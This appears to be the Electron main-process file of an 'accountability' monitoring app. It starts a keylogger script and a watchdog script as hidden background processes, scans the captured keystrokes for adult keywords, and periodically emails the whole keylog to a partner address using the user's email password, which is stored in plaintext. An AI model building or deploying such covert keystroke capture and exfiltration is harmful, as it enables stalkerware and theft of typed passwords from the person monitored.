// Importing required modules from Electron, path, fs, nodemailer and child_process
const nodemailer = require('nodemailer');
const { app, BrowserWindow, ipcMain } = require('electron');
const path = require('path');
const fs = require('fs');
const { exec } = require('child_process');

// Declare variables for the main window and keylogger process status
let mainWindow;
let keyloggerRunning = false; // Flag to track if the keylogger is running
// Path to the keywords file
const keywordsFilePath = path.join(__dirname, 'keywords.txt');
const keylogFilePath = path.join(__dirname, 'keylog.txt');

if (!fs.existsSync(keywordsFilePath)) {
  fs.writeFileSync(keywordsFilePath, '');  // Create an empty file if it doesn't exist
}

ipcMain.on('test-channel', (event, data) => {
  console.log('Received data from renderer:', data);
});

// Function to create the main application window
function createWindow() {
  // Initialize the main window with specific configurations
  mainWindow = new BrowserWindow({
    width: 800,
    height: 850,
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'), // Preload script to handle communication between renderer and main processes
      contextIsolation: true, // Enable context isolation
      nodeIntegration: false, // Allow node integration
    },
  });

  // Define the path to the setup details file, which stores the credentials:
  const setupDetailsPath = path.join(app.getPath('userData'), 'setup-details.json');

  // Check if the setup details already exist to determine which screen to load
  if (fs.existsSync(setupDetailsPath)) {
    console.log('Setup details found, loading monitoring.html');
    mainWindow.loadFile('monitoring.html'); // Load the monitoring screen to the main window
    startKeylogger(); // Start the keylogger if setup details exist
  } else {
    console.log('No setup details found, loading index.html');
    mainWindow.loadFile('index.html'); // Load the setup screen if no details are found
  }
  
  // mainWindow.on('close', (event) => {
  //   // Prevent the window from being fully closed so that the keylogger keeps running
  //   event.preventDefault();
  //   mainWindow.hide();  // You can hide the window instead of closing it
  // });

  // Event handler for when the main window is closed
  mainWindow.on('closed', function () {
    mainWindow = null; // Dereference the window object
  });
}


// IPC listener for saving setup details sent from the renderer process
ipcMain.on('save-setup-details', (event, details) => {
  console.log('Received setup details:', details);  // Log the details for debugging

  // Define the path to save the setup details
  const setupDetailsPath = path.join(app.getPath('userData'), 'setup-details.json');
  // Save the setup details as a JSON file
  fs.writeFileSync(setupDetailsPath, JSON.stringify(details));

  console.log('Setup details saved');
  console.log('Closing main window');

  // Close the main window after saving details
  if (mainWindow) {
    mainWindow.close();
  }

  // Start the keylogger process after saving details
  startKeylogger();
});

// Log termination to the keylog.txt file
function logToKeylogFile(message) {
  const timestamp = new Date().toLocaleString();
  const logMessage = `\n${timestamp} - ${message}\n`;
  fs.appendFileSync(keylogFilePath, logMessage);
}

// Function to start the keylogger process
function startKeylogger() {
  if (!keyloggerRunning) {
    console.log('Starting keylogger...');
    const keyloggerPath = path.join(__dirname, 'keylogger.js');
    const watchdogPath = path.join(__dirname, 'watchdog.js');

    // Command to start the keylogger script directly without a visible window
    const keyloggerCommand = `start "" /b node "${keyloggerPath}"`;

    // Command to start the watchdog script
    const watchdogCommand = `start "" /b node "${watchdogPath}"`;

    console.log(`Executing command: ${keyloggerCommand}`);
    console.log(`Executing watchdog command: ${watchdogCommand}`);

    // Use 'exec' to start the keylogger
    const keyloggerProcess = exec(keyloggerCommand);

    // Handle potential error events when attempting to start the keylogger
    keyloggerProcess.on('error', (error) => {
      console.error(`Failed to start keylogger process: ${error.message}`);
      keyloggerRunning = false;
    });

    // Handle the 'spawn' event indicating successful startup of the keylogger
    keyloggerProcess.on('spawn', () => {
      console.log('Keylogger started');
      keyloggerRunning = true;
    });

    // Use 'exec' to start the watchdog
    const watchdogProcess = exec(watchdogCommand);

    // Handle potential error events when attempting to start the watchdog
    watchdogProcess.on('error', (error) => {
      console.error(`Failed to start watchdog process: ${error.message}`);
    });

    // Handle the 'spawn' event indicating successful startup of the watchdog
    watchdogProcess.on('spawn', () => {
      console.log('Watchdog started');
    });

    // Optionally, detach the processes if needed
    keyloggerProcess.unref();
    watchdogProcess.unref();
  } else {
    console.log('Keylogger is already running');
  }
}


// Load keywords from file into an array
function loadKeywords() {
  const content = fs.readFileSync(keywordsFilePath, 'utf-8');
  return content.split(/\r?\n/).filter(Boolean);  // Split by line, remove empty lines
}

let keywords = loadKeywords();  // Load keywords initially















//  **********************  EMAIL FUNCTIONALITY ******************************
// ***************************************************************************


// Function to scan the entire keylog file for adult keywords
function scanLogFileBeforeEmail() {
  const logContent = fs.readFileSync(keylogFilePath, 'utf-8');
  let suspiciousWords = [];
  for (const keyword of keywords) {
    if (logContent.includes(keyword)) {
      logToKeylogFile(`[WARNING] Detected adult keyword in keylog: "${keyword}"`);
      suspiciousWords.push(keyword);  // Collect the suspicious words
    }
  }
  return suspiciousWords;  // Return the list of suspicious words
}


// Function to extract the service name from the email domain
function getEmailService(email) {
  const domain = email.split('@')[1].toLowerCase(); // Extract the domain from the email

  // Common email services
  if (domain.includes('gmail.com')) return 'gmail';
  if (domain.includes('yahoo.com') || domain.includes('ymail.com')) return 'yahoo';
  if (domain.includes('outlook.com') || domain.includes('hotmail.com') || domain.includes('live.com')) return 'hotmail';
  if (domain.includes('aol.com')) return 'aol';
  if (domain.includes('icloud.com') || domain.includes('me.com') || domain.includes('mac.com')) return 'icloud';
  if (domain.includes('zoho.com')) return 'zoho';
  if (domain.includes('protonmail.com')) return 'protonmail';
  
  // Other well-known services can be added here

  // If no common service, use the part before the first dot
  const genericService = domain.split('.')[0]; // Extract the part before the first dot (e.g., 'mail' from 'mail.example.com')
  
  // Warn the user for unrecognized services
  console.warn(`Unknown email provider: ${genericService}. Defaulting to basic setup.`);

  return genericService; // This will return the part before the first period (e.g., 'example' from 'example.com')
}


// Function to send the keylogger report via email
function sendEmailReport() {
  // Load the setup details (user's email and partner's email)
  const setupDetailsPath = path.join(app.getPath('userData'), 'setup-details.json');
  const setupDetails = JSON.parse(fs.readFileSync(setupDetailsPath, 'utf-8'));

  // Scan the log file for suspicious content
  const suspiciousWords = scanLogFileBeforeEmail();

  // Determine subject based on the presence of suspicious words
  let subject = "Keylogger Report - Nothing to report";
  let body = `Here is the latest keylogger report from your monitoring software.\n\nNo suspicious activity was found.`;

  if (suspiciousWords.length > 0) {
    subject = "Keylogger Report - SUSPICIOUS CONTENT FOUND";
    body = `The following suspicious words were entered by the user "${setupDetails.computerName}":\n\n`;
    body += suspiciousWords.join(', ');
  }


  // Get the email service based on the user's email
  const emailService = getEmailService(setupDetails.userEmail);

  if (!emailService) {
    console.error("Unsupported email provider. Please use Gmail, Yahoo, Hotmail, etc.");
    return;
  }

  // Setup Nodemailer transporter using the saved email credentials
  const transporter = nodemailer.createTransport({
    service: emailService, // You can adjust based on the user's email provider
    auth: {
      user: setupDetails.userEmail,
      pass: setupDetails.userPassword
    }
  });

  // Define email options
  const mailOptions = {
    from: setupDetails.userEmail,
    to: setupDetails.partnerEmail, // Send to accountability partner
    subject: subject,
    text: body,
    attachments: [
      {
        filename: 'keylog.txt',
        path: keylogFilePath
      }
    ]
  };

  // Send the email
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      logToKeylogFile(`Error sending email: ${error}`);
      // Notify the accountability partner in case of failure (optional)
      // notifyPartnerEmailFailure(setupDetails.partnerEmail);
    } else {
      logToKeylogFile(`Email sent successfully: ${info.response}`);
    }
  });
}





// Function to notify the accountability partner about email failure
// function notifyPartnerEmailFailure(partnerEmail) {
//   const errorMailOptions = {
//     from: 'noreply@monitoringsoftware.com',  // Placeholder, adjust as necessary
//     to: partnerEmail,
//     subject: 'Email Sending Failure',
//     text: 'The monitoring software failed to send the latest report due to incorrect email credentials. Please check the settings.'
//   };

//   const transporter = nodemailer.createTransport({
//     service: 'gmail',  // Replace with a dedicated service if necessary
//     auth: {
//       user: 'noreply@monitoringsoftware.com',  // Replace with a service account if available
//       pass: 'noreplypassword'  // Replace with the corresponding password
//     }
//   });

//   transporter.sendMail(errorMailOptions, (error, info) => {
//     if (error) {
//       console.error(`Failed to notify accountability partner: ${error}`);
//     } else {
//       console.log(`Notification sent to accountability partner: ${info.response}`);
//     }
//   });
// }



// Check if it's time to send the report (using saved frequency)
function shouldSendEmailReport() {
  const setupDetailsPath = path.join(app.getPath('userData'), 'setup-details.json');

  // Check if setup-details.json exists before trying to use it
  if (!fs.existsSync(setupDetailsPath)) {
    console.log("Setup details not found. Skipping email check.");
    return; // Exit the function if the file doesn't exist
  }

  const setupDetails = JSON.parse(fs.readFileSync(setupDetailsPath, 'utf-8'));
  
  // Assume `lastSentDate` was saved when the last email was sent (in setup-details.json)
  const lastSentDate = new Date(setupDetails.lastSentDate || Date.now());
  const reportFrequency = setupDetails.reportFrequency || 'daily'; // Default to daily

  const now = new Date();
  let timeDifference;

  // Calculate time difference based on frequency
  switch (reportFrequency) {
    case 'weekly':
      timeDifference = 7 * 24 * 60 * 60 * 1000; // 7 days
      break;
    case 'monthly':
      timeDifference = 30 * 24 * 60 * 60 * 1000; // 30 days
      break;
      case 'daily':
        timeDifference = 24 * 60 * 60 * 1000; // 1 day in milliseconds
      break;
    case 'test':  // Testing case for 5-minute intervals
      timeDifference = 1 * 60 * 1000; // 5 minutes in milliseconds
      break;
    default:
      timeDifference = 24 * 60 * 60 * 1000; // 1 day
      break;
  }


  // If lastSentDate is null (first time sending an email), or enough time has passed
  if (!lastSentDate || (now - lastSentDate) >= timeDifference) {
    logToKeylogFile("Time difference met. Sending email...");
    // Update the last sent date
    setupDetails.lastSentDate = now.toISOString();
    fs.writeFileSync(setupDetailsPath, JSON.stringify(setupDetails));

    // Log that the email is being sent
    logToKeylogFile('Sending email report...');
    
    sendEmailReport(); // Send the report
  } 
  // else {
  //   logToKeylogFile('Email report not yet due. Skipping.');
  // }
}


// // Set up the interval to check for email sending
// setInterval(shouldSendEmailReport, 5 * 60 * 1000); // Check every 5 minutes
setInterval(() => {
  shouldSendEmailReport();
}, 10 * 1000); // Check every 10 seconds

// // Set up the interval to check for email sending
// if (setupDetails.reportFrequency === 'test') {
//   setInterval(shouldSendEmailReport, 1 * 60 * 1000); // Check every 1 minute for testing
// } else {
//   setInterval(shouldSendEmailReport, 5 * 60 * 1000); // Check every 5 minutes for regular use
// }


















//  **********************  ELECTRON FUNCTIONALITY ******************************
// ***************************************************************************

// Event handler when Electron app is ready to create the window
app.on('ready', createWindow);

// Event handler when all windows are closed
app.on('window-all-closed', function () {
  // On non-Mac systems, don't quit the app if windows are closed to keep keylogger running
  if (process.platform !== 'darwin') {
    app.quit();
  }
});

// Event handler to recreate the window when the app is activated
app.on('activate', function () {
  if (mainWindow === null) {
    createWindow(); // Recreate the window if it was previously closed
  }
});


// mainWindow.on('close', (event) => {
//   // Prevent the window from being fully closed so that the keylogger keeps running
//   event.preventDefault();
//   mainWindow.hide();  // You can hide the window instead of closing it
// });
